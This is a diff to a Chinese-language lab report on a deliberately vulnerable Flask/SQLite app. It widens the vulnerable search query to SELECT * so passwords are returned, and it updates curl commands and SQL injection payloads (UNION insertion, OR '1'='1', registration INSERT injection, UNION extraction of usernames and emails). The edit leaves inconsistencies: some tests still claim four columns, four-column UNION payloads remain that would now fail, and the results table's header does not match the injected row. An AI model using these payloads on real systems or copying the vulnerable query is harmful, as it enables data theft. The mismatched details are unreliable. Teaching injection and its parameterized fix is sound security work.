@@ -26,7 +26,8 @@ status: 已完成
 ├── 业务逻辑层 (Flask)
 │   ├── /login           — 登录路由
 │   ├── /register        — 注册路由
-│   ├── /                — 首页 + 搜索路由
+│   ├── /                — 首页
+│   ├── /search          — 搜索路由
 │   └── /logout          — 登出路由
 │
 └── 数据层 (SQLite)
@@ -106,13 +107,12 @@ db.commit()
 
 注册成功后重定向到登录页，并在页面顶部显示绿色提示「注册成功，请登录」。
 
-#### 模块三：用户搜索（/）
+#### 模块三：用户搜索（/search）
 
-搜索功能集成在首页中，已登录用户可输入关键词搜索其他用户。SQL 语句通过 f-string 拼接：
+搜索功能提供独立的 `/search` 路由，已登录用户可输入关键词搜索其他用户。SQL 语句通过 f-string 拼接，并且使用 `SELECT *` 返回所有列（包括密码字段）：
 
 ```python
-query = f"SELECT id, username, email, phone FROM users \
-WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
+query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
 ```
 
 搜索的 SQL 语句会打印到控制台，便于观察注入效果：
@@ -144,8 +144,7 @@ print("=" * 55)
 
 ```python
 # ⚠️ 漏洞代码：f-string 直接拼接用户输入
-query = f"SELECT id, username, email, phone FROM users \
-WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
+query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
 results = db.execute(query).fetchall()
 ```
 
@@ -182,12 +181,12 @@ curl http://127.0.0.1:5000/login \
 
 **Step 2：执行 UNION 注入**
 
-构造 payload：`' UNION SELECT 1,'inj','inj@x.com','138'--`
+构造 payload：`' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'--`
 
-URL 编码后：`%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--`
+URL 编码后：`%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--`
 
 ```bash
-curl "http://127.0.0.1:5000/?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" \
+curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--" \
   -b /tmp/cookies.txt
 ```
 
@@ -195,18 +194,18 @@ curl "http://127.0.0.1:5000/?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x
 
 ```
 原始 SQL：
-SELECT id, username, email, phone FROM users
+SELECT * FROM users
 WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
 
 注入后 SQL：
-SELECT id, username, email, phone FROM users
+SELECT * FROM users
 WHERE username LIKE '%'
-UNION SELECT 1, 'inj', 'inj@x.com', '138'--%' OR email LIKE '%'
+UNION SELECT 1, 'inj', 'inj_pass', 'inj@x.com', '138'--%' OR email LIKE '%'
                     ↑
               UNION 合并了第二个 SELECT 的结果
 
-第二个查询返回 4 列数据：
-1, inj, inj@x.com, 138
+第二个查询返回 5 列数据：
+1, inj, inj_pass, inj@x.com, 138
 ```
 
 #### 攻击结果
@@ -217,7 +216,7 @@ UNION SELECT 1, 'inj', 'inj@x.com', '138'--%' OR email LIKE '%'
 |:--:|:------:|:----:|:----:|
 | 1 | admin | admin@example.com | 13800138000 |
 | 2 | alice | alice@example.com | 13900139001 |
-| **1** | **inj** | **inj@x.com** | **138** |
+| **1** | **inj** | **inj_pass** | **inj@x.com** | **138** |
 
 > ✅ **攻击成功** — 攻击者可以在搜索结果中插入任意数据，实现信息伪造和数据窃取
 
@@ -225,12 +224,12 @@ UNION SELECT 1, 'inj', 'inj@x.com', '138'--%' OR email LIKE '%'
 
 ```sql
 -- users 表有 5 列 (id, username, password, email, phone)
--- 但 SELECT 查询只选了 4 列 (id, username, email, phone)
--- 所以 UNION SELECT 也必须返回 4 列：
+-- SELECT * 返回全部5列
+-- 所以 UNION SELECT 也必须返回 5 列：
 
-SELECT id, username, email, phone FROM users     -- 4 列
+SELECT * FROM users     -- 5 列 (id, username, password, email, phone)
 UNION
-SELECT 1, 'inj', 'inj@x.com', '138'             -- 必须也是 4 列
+SELECT 1, 'inj', 'inj_pass', 'inj@x.com', '138'  -- 必须也是 5 列
 
 -- 如果列数不匹配，SQLite 会报错：
 -- "SELECTs to the left and right of UNION do not have the same number of result columns"
@@ -251,7 +250,7 @@ SELECT 1, 'inj', 'inj@x.com', '138'             -- 必须也是 4 列
 URL 编码后：`%27%20OR%20%271%27%3D%271`
 
 ```bash
-curl "http://127.0.0.1:5000/?keyword=%27%20OR%20%271%27%3D%271" \
+curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" \
   -b /tmp/cookies.txt
 ```
 
@@ -259,13 +258,13 @@ curl "http://127.0.0.1:5000/?keyword=%27%20OR%20%271%27%3D%271" \
 
 ```
 原始 SQL：
-SELECT id, username, email, phone FROM users
+SELECT * FROM users
 WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'
 
 注入 keyword = ' OR '1'='1
 
 生成 SQL：
-SELECT id, username, email, phone FROM users
+SELECT * FROM users
 WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                           ^^^^^^^^^^
                      '1' 永远等于 '1'，条件恒为 True
@@ -339,21 +338,21 @@ curl http://127.0.0.1:5000/login \
 #### 测试 A：admin' OR '1'='1 — 绕过搜索过滤
 
 ```
-请求：GET /?keyword=admin%27%20OR%20%271%27%3D%271
+请求：GET /search?keyword=admin%27%20OR%20%271%27%3D%271
 结果：返回所有用户数据 ✅
 ```
 
 #### 测试 B：' UNION SELECT 1,2,3,4-- — 列数探测
 
 ```
-请求：GET /?keyword=%27%20UNION%20SELECT%201,2,3,4--
+请求：GET /search?keyword=%27%20UNION%20SELECT%201,2,3,4--
 结果：成功确认查询返回4列 ✅
 ```
 
 #### 测试 C：' UNION SELECT 1,username,email,phone FROM users-- — 数据提取
 
 ```
-请求：GET /?keyword=%27%20UNION%20SELECT%201,username,email,phone%20FROM%20users--
+请求：GET /search?keyword=%27%20UNION%20SELECT%201,username,email,phone%20FROM%20users--
 结果：从 users 表中提取了所有用户名和邮箱 ✅
 ```
 
@@ -363,7 +362,7 @@ curl http://127.0.0.1:5000/login \
 
 | # | 测试项 | 攻击payload | 漏洞版结果 |
 |:--:|--------|-------------|:----------:|
-| POC 1 | UNION注入插入数据 | `' UNION SELECT 1,'inj','inj@x.com','138'--` | ✅ 成功 |
+| POC 1 | UNION注入插入数据 | `' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'--` | ✅ 成功 |
 | POC 2 | OR万能条件 | `' OR '1'='1` | ✅ 成功 |
 | POC 3 | 注册SQL注入 | `hacker', 'pass', 'h@x.com', '123')--` | ✅ 成功 |
 | 附加A | 搜索OR绕过 | `admin' OR '1'='1` | ✅ 成功 |
@@ -393,7 +392,7 @@ curl http://127.0.0.1:5000/login \
 
 ```python
 # ❌ f-string 拼接 — 攻击者可注入任意 SQL
-query = f"SELECT id, username, email, phone FROM users \
+query = f"SELECT * FROM users \
 WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
 results = db.execute(query).fetchall()
 ```
@@ -404,7 +403,7 @@ results = db.execute(query).fetchall()
 # ✅ 参数化查询 — 使用 ? 占位符
 like_pattern = f"%{keyword}%"
 results = db.execute(
-    "SELECT id, username, email, phone FROM users "
+    "SELECT * FROM users "
     "WHERE username LIKE ? OR email LIKE ?",
     (like_pattern, like_pattern)
 ).fetchall()
@@ -443,7 +442,7 @@ results = db.execute(
 | 函数 | 修复前（f-string） | 修复后（? 占位符） |
 |:----:|-------------------|------------------|
 | 登录验证 | `SELECT * FROM users WHERE username='{username}' AND password='{password}'` | `SELECT * FROM users WHERE username = ?` |
-| 登录后查信息 | `SELECT id, username, email, phone FROM users WHERE username='{result['username']}'` | `SELECT id, username, email, phone FROM users WHERE username = ?` |
+| 登录后查信息 | `SELECT * FROM users WHERE username='{result['username']}'` | `SELECT * FROM users WHERE username = ?` |
 | 搜索用户 | `SELECT ... LIKE '%{keyword}%'` | `SELECT ... LIKE ?`（参数传 `%keyword%`） |
 | 注册插入 | `INSERT INTO users ... VALUES ('{username}', '{password}', '{email}', '{phone}')` | `INSERT INTO users ... VALUES (?, ?, ?, ?)` |
 | 初始化 admin | `VALUES ('admin', 'admin123', ...)` | `VALUES (?, ?, ?, ?)`（参数化） |
@@ -595,7 +594,7 @@ cursor.execute("INSERT INTO users (username, password, email, phone) VALUES (?, 
 
 | # | 测试 | 攻击 payload | 漏洞版 | 修复版 | 状态 |
 |:--:|------|-------------|:------:|:------:|:----:|
-| 1 | UNION 注入 | `' UNION SELECT 1,'inj','inj@x.com','138'--` | ✅ 成功 | ❌ 阻止 | ✅ |
+| 1 | UNION 注入 | `' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'--` | ✅ 成功 | ❌ 阻止 | ✅ |
 | 2 | OR 万能条件 | `' OR '1'='1` | ✅ 成功 | ❌ 阻止 | ✅ |
 | 3 | 注册注入 | `hacker', 'pass', 'h@x.com', '123')--` | ✅ 成功 | ❌ 阻止 | ✅ |
 | 4 | UNION 数据提取 | `' UNION SELECT 1,username,email,phone FROM users--` | ✅ 成功 | ❌ 阻止 | ✅ |
@@ -617,7 +616,7 @@ curl http://127.0.0.1:5000/login \
   -d "username=admin&password=admin123" -c /tmp/test.txt
 
 # 3. 验证 UNION 注入被阻止
-curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" \
+curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--" \
   -b /tmp/test.txt | grep "inj"
 # 预期结果：无输出（注入数据未出现在表格中）
 
